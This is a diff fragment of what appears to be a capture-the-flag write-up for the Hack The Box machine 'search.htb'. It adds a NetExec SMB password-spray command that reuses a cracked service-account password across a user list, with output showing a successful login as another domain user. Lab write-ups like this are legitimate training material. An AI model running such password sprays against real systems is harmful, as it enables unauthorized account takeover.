@@ -334,8 +334,11 @@ I have read and write ab both of my compromised users!
 
 # Password spray via password reuse
 
+Since this is a service account, another user is likely controller the service account making it likely to be password reuse
+
 ```python
 nxc smb research.search.htb -u users.txt -p '@3ONEmillionbaby' --continue-on-success
 
-
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby
 ```
+I have compromised another user!
